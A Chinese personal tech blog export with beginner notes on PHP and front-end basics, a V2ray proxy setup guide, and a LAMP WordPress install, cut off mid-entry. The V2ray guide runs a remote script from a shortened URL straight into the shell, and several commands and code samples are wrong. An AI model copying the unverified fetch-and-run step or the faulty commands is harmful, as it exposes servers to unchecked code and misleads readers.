title="解释性语言与编译型语言"></a>解释性语言与编译型语言</h3><ol><li><p>解释型语言</p><blockquote><p>如：<code>PHP</code>，<code>Python</code>，<code>Shell</code><br>由上到下解释每一行<br>特点：每次使用，每次解释，且需要解释器<br>兼容性问题基本没有</p></blockquote></li><li><p>编译型语言</p><blockquote><p>如：<code>C</code>,<code>C++</code>，<code>Java</code><br>需要编译才能执行（将文本文件<code>test.c</code>编译成二进制文件<code>test.exe</code>）<br>编译后生成二进制文件，让系统执行<br>特点：一次编译，多次使用；但跨平台性较弱，需要修改源码。<br>比如c语言有如下两个标准：</p><blockquote><p><code>c90+win</code>编译标准<br><code>c99+linux</code>编译标准<br>他们不能通用</p></blockquote></blockquote></li></ol><hr><h3 id="PHP与JSP"><a href="#PHP与JSP" class="headerlink" title="PHP与JSP"></a>PHP与JSP</h3><p>PHP适用于小型网站<br>JSP遵循java语法，且用于大型网站<br>中型网站两者混用</p><hr><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>例子：</p><blockquote><p>使用php输出that’s ok</p><ol><li>使用双引号中插入单引号</li><li>使用单引号，但时加上转义字符<code>\</code></li></ol></blockquote><hr><h3 id="PHP中布尔类型特点"><a href="#PHP中布尔类型特点" class="headerlink" title="PHP中布尔类型特点"></a>PHP中布尔类型特点</h3><p>只要“错”就是“空”，但是一旦被赋为某种类型，就与“空”没有关系了</p><h3 id="常见网站搭建套路（铁三角）"><a href="#常见网站搭建套路（铁三角）" class="headerlink" title="常见网站搭建套路（铁三角）"></a>常见网站搭建套路（铁三角）</h3><blockquote><p><code>apache/nginx + php + mysql</code> 开源<code>(php)</code>全家桶<br><code>tomcat + jsp + oracle</code>     其中<code>java，oracle</code>不开源<br><code>iis + asp + mssql/access</code>    微软全家桶，贵，功能少，质量差(常见于建站早，更换搭建方式代价极高的网站)</p></blockquote><hr><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>以规则对抗规则，即防御规则对抗攻击规则<br>写100条防御语句，找出一条没被防御到的语句</p><p>fuzz：模糊规则</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Back-end </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>前端开发入门</title>
      <link href="/2018/12/09/Front-end/"/>
      <url>/2018/12/09/Front-end/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要为前端开发做个引子，对常见的或者常用的知识做个简介，包括HTML、CSS、Javascript一些入门级知识</p><p><strong>注：补充知识放在文末</strong></p><hr><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p><strong>HTML不是一种编程语言，而是一种超文本标记语言</strong></p><blockquote><p>网页的本质就是超级文本标记语言，通过结合使用其他的Web技术（如：脚本语言、公共网关接口、组件等），可以创造出功能强大的网页。因而，超级文本标记语言是万维网（Web）编程的基础，也就是说万维网是建立在超文本基础之上的。超级文本标记语言之所以称为超文本标记语言，是因为文本中包含了所谓“超级链接”点。</p></blockquote><hr><h4 id="Form表单"><a href="#Form表单" class="headerlink" title="Form表单"></a>Form表单</h4><p>输入框<code>&lt;input/&gt;</code>标签最常用<br><code>type=&quot;text&quot;</code>普通的文本输入框<br><code>type=&quot;password&quot;</code>带星号的密码输入框<br><code>type=&quot;radio&quot;</code>单选框，同一类型要有相同的name，表明是同一类<br><code>type=&quot;chechbox&quot;</code>复选框，添加checked属性会默认选中<br><code>type=&quot;file&quot;</code>文件上传选择<br><code>type=&quot;email&quot;</code>带简单验证的邮箱输入<br><code>&lt;textarea&gt;</code>标签input只能单行输入，textarea可以多行输入</p><hr><h4 id="HTML元素属性"><a href="#HTML元素属性" class="headerlink" title="HTML元素属性"></a>HTML元素属性</h4><table><thead><tr><th><strong>属性</strong></th><th><strong>值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>class</td><td>classname</td><td>规定元素的类名（classname）</td></tr><tr><td>id</td><td>id</td><td>规定元素的唯一id</td></tr><tr><td>title</td><td>text</td><td>规定元素的行内样式（inline style）</td></tr><tr><td>style</td><td>style_definition</td><td>规定元素的额外信息（可在工具提示中显示）</td></tr></tbody></table><hr><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><h4 id="样式的引入"><a href="#样式的引入" class="headerlink" title="样式的引入"></a>样式的引入</h4><p>优先级：</p><blockquote><p>行内式 &gt; 内嵌式 &gt; 外链式</p></blockquote><p>行内样式：<br><code>&lt;p style = &quot;display:none&quot;&gt;&lt;/p&gt;</code></p><p>内嵌式<br>一般指<code>&lt;head&gt;</code>标签中的<code>&lt;style&gt;</code>样式</p><p>外链式<br>通过<code>&lt;link&gt;</code>标签引入外部的CSS文件</p><p>导入外部样式：<br>用<code>@import</code>在<code>&lt;head&gt;</code>与<code>&lt;/head&gt;</code>间引入</p><hr><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><blockquote><p>元素选择器：文档的元素就是最基本的选择器，如：p、h1、em、a<br>id选择器：配合元素的id属性，以‘#’ + id实现选择<br>类选择器：配合元素的class属性，以‘.’+className实现选择<br>属性选择器：对带有指定属性的HTML元素设置样式<br>派生选择器：通过依据元素在其位置的上下文关系来定义样式<br>自元素选择器：类似派生选择器，但是只能选择第一级子元素</p></blockquote><hr><h4 id="CSS选择器权重计算"><a href="#CSS选择器权重计算" class="headerlink" title="CSS选择器权重计算"></a>CSS选择器权重计算</h4><p>通常来说：</p><blockquote><p>行内 &gt; 内链 &gt; 外部样式<br>ID &gt; class &gt; 元素</p></blockquote><p>不同选择器有不同的权重：</p><ol><li>第一等：代表内联样式，如：<code>style=&quot; &quot;</code>，权值为1000</li><li>第二等：代表ID选择器，如：<code>#content</code>，权值为0100</li><li>第三等：代表类、伪类和属性选择器，如：<code>.content</code>，权值为0010</li><li>第四等：代表类型选择器和伪元素选择器，如：<code>div p</code>，权值为0001</li><li>第五等：通配符、子选择器、相邻选择器等的，如：<code>*</code>、<code>&gt;</code>、<code>+</code>，权值为0000</li><li>继承的样式没有权值</li><li>有时还会用到交集选择器</li></ol><hr><h4 id="CSS属性"><a href="#CSS属性" class="headerlink" title="CSS属性"></a>CSS属性</h4><p>文字属性<br>符号属性<br>背景属性<br>连接属性<br>鼠标光标样式属性</p><hr><h4 id="CSS定位和浮动"><a href="#CSS定位和浮动" class="headerlink" title="CSS定位和浮动"></a>CSS定位和浮动</h4><p>定位通过使用position属性，可以选择4种不同类型的定位，这会影响元素框的生成的方式</p><p>positon属性值：<br>Static<br>Relative<br>Absolute<br>fixed</p><hr><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>JavaScript 是脚本语言，是一种轻量级的编程语言，时刻插入HTML的编程代码，插入HTML页面后，可由所有的现代浏览器执行，且很容易学习。</p><hr><h4 id="写入HTML输入"><a href="#写入HTML输入" class="headerlink" title="写入HTML输入"></a>写入HTML输入</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined">document.write(&quot;&lt;h1&gt;This is a heading&lt;/h1&gt;&quot;);<br>document.write(&quot;&lt;p&gt;This is a paragraph&lt;/p&gt;&quot;);<br></code></pre></td></tr></table></figure><hr><h4 id="前端验证逻辑——事件"><a href="#前端验证逻辑——事件" class="headerlink" title="前端验证逻辑——事件"></a>前端验证逻辑——事件</h4><ol><li>点击事件（onclick）调用js函数验证常用于点击提交按钮后，验证提交内容是否符合标准</li><li>离开输入框（onchange）调用js函数验证常用语注册页面，修改信息页面的固定格式<br>如：电话、身份证号、邮箱等有固定格式的内容。</li></ol><p>对事件做出反应<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined">&lt;button type=&quot;button&quot; onclick=&quot;alert(&apos;Welcome!&apos;)&quot; name=&quot;button&quot;&gt;button&lt;/button&gt;<br></code></pre></td></tr></table></figure></p><hr><h4 id="改变HTML内容"><a href="#改变HTML内容" class="headerlink" title="改变HTML内容"></a>改变HTML内容</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined">x=document.getElementById(&quot;demo&quot;);  // 找到元素<br>x.innerHTML=&quot;Hello javascript&quot;; // 改变text内容<br>x.style.color=&quot;#ff0000&quot;;  //该百年样式<br></code></pre></td></tr></table></figure><hr><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="isNaN"><a href="#isNaN" class="headerlink" title="isNaN"></a>isNaN</h4><p>isNaN()函数用于检查其参数是否是非数字值。<br>eg: inNaN(x)</p><blockquote><p>x is not a number: <code>true</code><br>x in a number: <code>false</code></p></blockquote><hr><h4 id="利用JavaScript获取coockie"><a href="#利用JavaScript获取coockie" class="headerlink" title="利用JavaScript获取coockie"></a>利用JavaScript获取coockie</h4><p>代码：<br><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;<br>  function getCookie(name) &#123;<br>    var arr,reg=new RegExp("(^|)"+name+"=([^;]*)(;|$");<br>    if(arr=document.cookie.match(reg))<br>      return unescape(arr[2]);<br>    else<br>      return null;<br>  &#125;<br>  alert(getCookie("user"));<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></p><hr><h4 id="练习质数生成编写"><a href="#练习质数生成编写" class="headerlink" title="练习质数生成编写"></a>练习质数生成编写</h4><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!DOCTYPE html&gt;<br>&lt;html lang="en" dir="ltr"&gt;<br>  &lt;head&gt;<br>    &lt;meta charset="utf-8"&gt;<br>    &lt;title&gt;Print prime number&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;script type="text/javascript"&gt;<br>      var flag=1;<br>      for(var i=1;i&lt;=100;i++)&#123;<br>        flag=1; // Reset flag<br>        if(i&gt;=2)&#123;<br>          for(var j=2;j&lt;i;j++) &#123;  // Judge weather a prime number<br>            if(i%j==0) &#123;<br>              flag=0; break;<br>            &#125;<br>          &#125;<br>          if(flag==1)&#123;<br>            document.write("  "+i);<br>          &#125;<br>        &#125;<br>      &#125;<br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><hr><h4 id="练习斐波那契数列编写"><a href="#练习斐波那契数列编写" class="headerlink" title="练习斐波那契数列编写"></a>练习斐波那契数列编写</h4><p><a href="/Other/fibonacci.html">代码执行结果</a><br><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!DOCTYPE html&gt;<br>&lt;html lang="en" dir="ltr"&gt;<br>  &lt;head&gt;<br>    &lt;meta charset="utf-8"&gt;<br>    &lt;title&gt;Fibonacci&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h3&gt;计算斐波那契数列第&lt;a id="x"&gt;n&lt;/a&gt;项&lt;/h3&gt;<br>    第&lt;a id="x"&gt;n&lt;/a&gt;项为：&lt;a id="result"&gt;无输出&lt;/a&gt;<br>    &lt;p&gt;&lt;input type="text" id="input"&gt;&lt;/p&gt;&lt;br&gt;<br>    &lt;script type="text/javascript"&gt;<br>      // 计算菲波纳数列的第n项：1,1,2,3,5,8,13,...,<br>      function Fibonacci() &#123;<br>        var temp1=0;<br>        var temp2=0;<br>        var n=0;<br>        input = document.getElementById("input").value; // The number of the digit<br>        for(var i=0; i &lt;= input; i++) &#123;<br>          if(i==0)&#123;<br>            n=0;<br>          &#125;else if(i==1) &#123;<br>            n=1;<br>          &#125;else if(i==2) &#123;<br>            temp1=0;  temp2=1;<br>            n=temp1+temp2;<br>            temp1=temp2;<br>            temp2=n;<br>          &#125;else if(i&gt;2) &#123;<br>            n=temp1+temp2;<br>            temp1=temp2;<br>            temp2=n;<br>          &#125;<br>          document.getElementById("x").innerHTML=input;<br>          document.getElementById("result").innerHTML=n;<br>        &#125;<br>      &#125;<br>    &lt;/script&gt;<br>    &lt;button type="button" name="button" onclick="Fibonacci()"&gt;Calculate&lt;/button&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure></p><hr><h4 id="学习平台链接"><a href="#学习平台链接" class="headerlink" title="学习平台链接"></a>学习平台链接</h4><p><a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">W3C官网</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> CSS </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>V2ray科学上网教程</title>
      <link href="/2018/12/08/V2ray-Tutorial/"/>
      <url>/2018/12/08/V2ray-Tutorial/</url>
      
        <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>因为个人工作、学习、性质的需要，常常需要能够自由地上网，但苦于使用别人提供的服务代价较高，因此自己做了个微小的工作，在各路大佬的帮助下，算是能够科学上网了。</p><p><strong>注：补充知识放在文末</strong></p><hr><h3 id="准备一台VPS"><a href="#准备一台VPS" class="headerlink" title="准备一台VPS"></a>准备一台VPS</h3><p>如果你是通过搜索引擎搜索关于科学上网相关内容，多看几篇相关教程，你就会发现，大部分都在打广告。由于这些VPS服务商都会对自家产品进行推广，因此已注册用户帮助进行推广，能得到较为丰厚的收益。</p><p>比如你通过<a href="https://www.vultr.com/?ref=7685138" target="_blank" rel="noopener">我的推广链接</a>进行注册并使用</p><p>你就会发现爱心的传递原来是这么简单的事情！</p><p>不同服务商的服务对不同地区的用户效果会不同，最好能够多试几家，适合自己的才是最好的。</p><p>服务商一般会提供不同价位、不同地区节点的选项，选择好后，里面有可以更换不同操作系统等功能，依据自己的实际需求选择即可。</p><p>本篇教程基于V2ray搭建，为使用大佬脚本所推荐的系统，这里选择Debain9 64位。</p><hr><h3 id="远程控制VPS"><a href="#远程控制VPS" class="headerlink" title="远程控制VPS"></a>远程控制VPS</h3><p>如果你是windows系统，且cmd中未配置ssh服务，可使用Xshell进行ssh远程登录。<br><a href="https://xshell.en.softonic.com/" target="_blank" rel="noopener">Xshell官网地址</a><br>直接进软件输入命令：</p><blockquote><p>ssh YourServerIP    // YourServerIP 替换为VPS的IP 地址</p></blockquote><p>此时会弹出窗口，按照窗口提示，输入VPS服务中提供的用户名、密码信息，即可登录成功。</p><hr><p>如果你是类unix系统，先配置ssh服务，然后使用系统终端输入命令：</p><blockquote><p>ssh UserName@YourServerIP    // UserName 替换为VPS服务提供的用户名</p></blockquote><p>和windows一样，按命令行提示输入相关信息，登录。</p><hr><h3 id="V2ray安装与配置"><a href="#V2ray安装与配置" class="headerlink" title="V2ray安装与配置"></a>V2ray安装与配置</h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>远程登录了VPS后，在终端输入下列命令：</p><p>安装或更新curl，并使用curl运行V2ray多用户安装脚本进行安装：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># sudo apt-get update -y<br># sudo apt-get install curl<br># source &lt;(curl -sL https://git.io/fNgqx)<br></code></pre></td></tr></table></figure></p><p><a href="https://github.com/Jrohy/multi-v2ray" target="_blank" rel="noopener">开源代码作者的github源码</a></p><p>进入脚本原作者的github，里面有详细的图文步骤，依葫芦画瓢，完成服务端V2ray搭建，并开启服务。</p><p>选择查看配置，复制已经生成的账号的配置文件链接，链接格式是“vmess:”开头的一串链接。</p><hr><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><h5 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h5><p>进入<a href="https://github.com/2dust/v2rayN/releases" target="_blank" rel="noopener">V2rayN</a>的github页面，选择.zip文件下载</p><p>解压缩，打开v2rayN.exe运行，点击从URL批量导入选项，将会从剪贴板导入在服务端复制好的账号配置链接，运行服务即可。</p><hr><h5 id="浏览器配置"><a href="#浏览器配置" class="headerlink" title="浏览器配置"></a>浏览器配置</h5><p>这里使用的是<a href="http://www.firefox.com.cn/" target="_blank" rel="noopener">Firefox</a>浏览器</p><p>进入浏览器，选项–&gt;网络设置，选择“手动代理配置”，SOCKS主机填<code>127.0.0.1</code>，端口<code>1080</code>，选择SOCKS v5，使用SOCKS v5时代理DNS查询，确定后退出，设置完毕。</p><p><strong>至此，浏览器应该可以科学上网了。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 科学上网 </tag>
            
            <tag> V2ray </tag>
            
            <tag> VPS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于LAMP的WordPress动态博客搭建</title>
      <link href="/2018/12/05/Linux_wordpress_setup/"/>
      <url>/2018/12/05/Linux_wordpress_setup/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要说明Linux下基于LAMP的WordPress动态博客的搭建过程。<br>从网站流量上来说，70%以上的访问流量都是LAMP来提供的，是开源的极为强大的网站解决方案。而WordPress功能强大，插件众多，易于扩充功能，安装与使用都极为方便。此组合非常适合新手进行网站搭建的练手。<br>因为此前在网上查找的其他相关文章或多或少存在一些问题，此处将个人实际成功的步骤记录下来，方便自己与他人的查询。</p><p><strong>注：安装步骤中的知识补充放在文末。</strong></p><hr><h4 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h4><p>物理机：Windows 10 Enterprise<br>虚拟机：CentOS 7 64位</p><hr><h3 id="LAMP环境搭建"><a href="#LAMP环境搭建" class="headerlink" title="LAMP环境搭建"></a>LAMP环境搭建</h3><h4 id="Apache安装"><a href="#Apache安装" class="headerlink" title="Apache安装"></a>Apache安装</h4><p>在CentOS下，Apache软件安装包又叫httpd，此前曾使用过源码编译安装过httpd，这里使用简单的yum命令安装即可：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># yum install httpd<br></code></pre></td></tr></table></figure></p><blockquote><p>systemctl start httpd     // 开启Apache服务<br>systemctl status httpd    // 查看Apache服务状态<br>chkconfig –level 2345 httpd on     // 设置服务在运行级别为2、3、4、5的情况下都为开启的状态<br>systemctl enable httpd    // 设置服务开机自启</p></blockquote><blockquote><p>systemctl list-unit-files|grep firewalld.service     //查看防火墙状态<br>systemctl stop firewalld.service     // 停止防火墙服务<br>systemctl disable firewalld.service     // 禁止防火墙开机自启</p></blockquote><p>验证Apache是否安装成功：<br>在浏览器中输入CentOS系统服务器IP地址：<br><code>http://{YourServerAddress}</code><br>若出现Apache相关页面，则安装成功</p><hr><h4 id="MySQL安装"><a href="#MySQL安装" class="headerlink" title="MySQL安装"></a>MySQL安装</h4><p>由于mysql在CentOS的源中被移除，因此这里安装其分支产品mariaDB数据库。<br>查找所需安装包并安装：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># yum search mariadb<br># yum install mariadb.x86_64 mariadb-server.x86_64 mariadb-libs.x86_64 mariadb-devel.x86_64<br></code></pre></td></tr></table></figure></p><p>启动mysql并设置在特定运行级别为开启状态：</p><blockquote><p>service mariadb start<br>chkconfig –level 2345 mariadb on</p></blockquote><p>设置mariaDB初始密码并登陆：</p><blockquote><p>mysqladmin -u root -p password<br>mysql -u root -p</p></blockquote><p>修改密码：</p><blockquote><p>use mysql;<br>update mysql.user set authentication_string=password(‘YourPassword’) where user=’root’ ;</p></blockquote><p>重启Mysql服务并登陆验证所修改信息：</p><blockquote><p>systemctl restart mysqld.service<br>mysql -u root -p</p></blockquote><hr><h4 id="PHP安装"><a href="#PHP安装" class="headerlink" title="PHP安装"></a>PHP安装</h4><p>查找所需安装包并安装：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># yum search php<br># yum install php.x86_64 php-mysql.x86_64 php-pear php-pear-DB php-gd<br></code></pre></td></tr></table></figure></p><p>验证PHP安装：</p><blockquote><p>vi /var/www/html/info.php     // 新建文件，并输入下列内容</p></blockquote><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> php phpinfo(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>重启Apache Web服务器： <code>systemctl restart apache2</code><br>打开URL：<code>http://{YourServerAddress}/info.php</code><br>若能显示php信息页面，则安装成功。</p><hr><h3 id="WordPress个人博客搭建"><a href="#WordPress个人博客搭建" class="headerlink" title="WordPress个人博客搭建"></a>WordPress个人博客搭建</h3><h4 id="WordPress安装"><a href="#WordPress安装" class="headerlink" title="WordPress安装"></a>WordPress安装</h4><p>进入WordPress官网<a href="https://cn.wordpress.org/download/" target="_blank" rel="noopener">https://cn.wordpress.org/download/</a><br>复制下载链接，进行下载安装操作：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz // 下载<br># tar -xzvf wordpress-4.9.4-zh_CN.tar.gz // 解压<br># mv -r wordpress /var/www/html/ // 进入下载根目录，移动文件<br></code></pre></td></tr></table></figure><blockquote><p>打开URL：<code>http://{YourServerAddress}/wordpress</code><br>此时若能访问到正常页面，则可进入下一步。<br>按照安装前的提示信息进行准备，确认无误后，单机开始按钮进行安装</p></blockquote><blockquote><p>填入数据库名、用户名密码，数据库主机和表前缀先按默认来，完成后提交</p></blockquote><blockquote><p>接下来步骤按提示进行，即可完成安装WordPress</p></blockquote><p>进行验证：</p><blockquote><p>打开URL：<code>http://{YourServerAddress}/wordpress</code>，即可进入自己的WordPress博客<br>可以在URL：<code>http://{YourServerAddress}/wordpress/wp-admin</code>，进行自己的博客管理</p></blockquote><p><strong>至此，基于LAMP的WordPress动态个博客搭建成功</strong></p><hr><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="LAMP是什么"><a href="#LAMP是什么" class="headerlink" title="LAMP是什么"></a>LAMP是什么</h4><blockquote><p>LAMP = Linux + Apache + MySQL + PHP<br>WAMP = Windows + Apache + MySQL + PHP</p></blockquote><hr><h4 id="mysql修改密码"><a href="#mysql修改密码" class="headerlink" title="mysql修改密码"></a>mysql修改密码</h4><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">&gt; use mysql;<br>&gt; UPDATE user SET password=password("YourPassword") WHERE user='root'<br>&gt; exit;<br></code></pre></td></tr></table></figure><p>如果提示无法修改密码，可尝试如下操作：</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># service mysql stop<br># mkdir -p /var/run/mysqld<br># chwon -R mysql:mysql /var/run/mysqld /usr/bin/mysqld_safe --skip-grant-tables --skip-networking<br></code></pre></td></tr></table></figure><p>再开启一个终端：<br><code># mysql -u root</code><br><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">&gt; use mysql;<br>&gt; update user set authentication_string=password("YourPassword") where user='root';<br>&gt; update user set plugin="mysql_native_password";<br>&gt; flush privileges;#更新所有操作权限<br></code></pre></td></tr></table></figure></p><hr><h4 id="mysql数据库创建与权限管理"><a href="#mysql数据库创建与权限管理" class="headerlink" title="mysql数据库创建与权限管理"></a>mysql数据库创建与权限管理</h4><p>常用操作：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># mysql -u root -p <br># 使用用户名密码登陆root账号<br></code></pre></td></tr></table></figure></p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">&gt; show databases; #查看当前有哪些数据库<br>&gt; create database wordpress; #创建新的名为wordpress的数据库<br>&gt; create user admin identified by 'YourPassword'; #创建用户admin<br>&gt; drop user admin; #删除用户admin<br>&gt; show grants for admin; #查看admin权限<br>&gt; grant select on test.* to admin; #授予用户admin对数据库test的查询权限<br>&gt; revoke select on test.* from admin; #收回相应权限<br>&gt; quit; #退出<br></code></pre></td></tr></table></figure><p>常用用户权限如下：</p><blockquote><p>CREATE： 允许MySQL用户创建新的表或数据库<br>DROP：允许删除表或数据库<br>DELETE：    允许从表中删除行<br>INSERT：    允许向表中插入行<br>SELECT：    允许使用Select命令来读取数据库<br>UPDATE：    允许更新表行<br>GRANT OPTION：允许授予或删除其他用户的权限<br>ALL PRIVILEGES：允许访问指定的数据库</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CentOS </tag>
            
            <tag> WordPress </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Httpd编译安装教程</title>
      <link href="/2018/12/04/Httpd%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2018/12/04/Httpd%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>本文主要说明httpd的编译安装过程。<br>源码安装是比较麻烦的一种安装方法，但却有其不可替代性。<br>因为此前在网上查找的其他相关文章或多或少存在一些问题，此处将个人实际成功的步骤记录下来，方便自己与他人的查询。</p><p>注：安装步骤中的知识补充放在文末。</p><hr><h4 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h4><p>物理机：Windows 10 Enterprise<br>虚拟机：CentOS 7 64位</p><hr><h3 id="具体操作流程"><a href="#具体操作流程" class="headerlink" title="具体操作流程"></a>具体操作流程</h3><p>首先安装开发者套件：<br><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># yum groups mark convert<br># yum groupinstall &quot;Development Tools&quot; -y // 整套安装一组开发者工具<br></code></pre></td></tr></table></figure></p><h4 id="下载源码包："><a href="#下载源码包：" class="headerlink" title="下载源码包："></a>下载源码包：</h4><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs undefined"># cd /usr/local/src/<br># wget https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-1.6.5.tar.gz<br># wget https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-util-1.6.1.tar.gz<br># wget https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/httpd-2.4.37.tar.gz<br></code></pre></td></tr></table></figure><p>备注：三个源码包都放在<code>/usr/local/src/</code></p><hr><h4 id="安装apr-1-6-5"><a href="#安装apr-1-6-5" class="headerlink" title="安装apr-1.6.5"></a>安装apr-1.6.5</h4><figure class="hljs 